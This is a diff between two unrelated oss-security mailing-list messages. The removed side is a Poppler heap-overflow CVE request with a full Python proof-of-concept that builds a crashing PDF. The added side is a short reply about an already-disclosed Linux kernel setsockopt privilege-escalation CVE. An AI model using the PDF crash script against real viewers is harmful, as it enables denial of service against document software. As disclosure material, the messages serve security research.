@@ -1,103 +1,24 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/12/1
-Message-ID: <CAEDLTO9PTJy54Wqbb3c63phUbv5xCKJHkueNfFKtb0hy6VxpVQ@mail.gmail.com>
-Date: Mon, 11 Apr 2016 20:52:27 -0300
-From: Felipe <felipe.andres.manzano@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/14
+Message-ID: <20160929135430.GA11369@chrystal.uk.oracle.com>
+Date: Thu, 29 Sep 2016 15:54:30 +0200
+From: Quentin Casasnovas <quentin.casasnovas@...cle.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: Poppler < 0.40.0
+Cc: "cve-assign@...re.org" <cve-assign@...re.org>
+Subject: Re: CVE request - Linux kernel through 4.6.2 allows escalade privileges via IP6T_SO_SET_REPLACE compat setsockopt call
 Content-Type: text/plain; charset=utf-8
 
-This is a clean heap overflow. Lib is used in evince and okular and for
-preview in nautilus. Versions pre 0.40.0 are vulnerable.
+On Thu, Sep 29, 2016 at 07:43:35AM +0000, 张谦 wrote:
+> Hi there,
+> I found a memory corruption vulnerabiliry in Linux kernel through 4.6.2, and I have a working exploit to escalade privileges which requires the ip6_tables module to be loaded, that it is properly blocked on all up-to-date versions.
+> Due to the number of users running vulnerable code(not update to 4.7 or higher), and that this exploit is only available to security researchers and kernel packagers upon request but that I don't want it to spread.
+> 
+> I have reported this issue to Linux kernel official and they have already fixed this.
+> And I would like to request CVE-ID for this issue.
+> 
 
-The patch:
-https://cgit.freedesktop.org/poppler/poppler/commit/?id=b3425dd3261679958cd56c0f71995c15d2124433
+This was already disclosed here and CVEs were assigned AFAICT:
 
+ http://seclists.org/oss-sec/2016/q2/599
 
-A crashy pdf file is attached.
-
-PoC.py
-from miniPDF.miniPDF import *
-#from miniPDF.miniPDFO import *
-import zlib
-#The document
-doc = PDFDoc()
-
-#font
-font = PDFDict()
-font.add("Name", PDFName("F1"))
-font.add("Subtype", PDFName("Type1"))
-font.add("BaseFont", PDFName("Helvetica"))
-
-#name:font map
-fontname = PDFDict()
-fontname.add("F1",font)
-
-#resources
-resources = PDFDict()
-resources.add("Font",fontname)
-
-
-data = '''BT /F1 24 Tf 240 700 Td (Pedefe Pedefeito
-endstream
-endobj
-obj 1 0
-99
-endobj
-Pedefeon!) Tj
-ET /GS3 gs'''
-#contents
-contentsDict = PDFDict()
-contents= PDFStream({},data)
-
-
-length = PDFNum(len(data))
-doc.add(length)
-contents.add('Length',PDFRef(length))
-#page
-page = PDFDict()
-page.add("Type",PDFName("Page"))
-page.add("Resources",resources)
-page.add("Contents", PDFRef(contents))
-
-#pages
-pages = PDFDict()
-pages.add("Type", PDFName("Pages"))
-pages.add("Kids", PDFArray([PDFRef(page)]))
-pages.add("Count", PDFNum(1))
-
-#add parent reference in page
-page.add("Parent",PDFRef(pages))
-
-
-#catalog
-catalog = PDFDict()
-catalog.add("Type", PDFName("Catalog"))
-catalog.add("Pages", PDFRef(pages))
-
-doc.add([catalog,pages,page,contents])
-doc.setRoot(catalog)
-
-
-#The Function thing
-function = PDFDict()
-function.add("FunctionType",PDFNum(2))
-function.add("Domain",PDFArray([0,1]))
-function.add("N",PDFNum(100))
-#2261634.5098039214
-size = 10000000
-function.add("C0",PDFArray([2261634.5098039214]*size))
-function.add("C1",PDFArray([2261634.5098039214]*size))
-
-
-extgstate = PDFDict()
-extgstate.add("Type",PDFName("ExtGState"))
-extgstate.add("TR",function)
-
-resources.add("ExtGState","<< /GS3 "+str(extgstate)+">>")
-
-print doc
-
-Content of type "text/html" skipped
-
-Download attachment "crash.pdf.gz" of type "application/x-gzip" (2436 bytes)
+Quentin
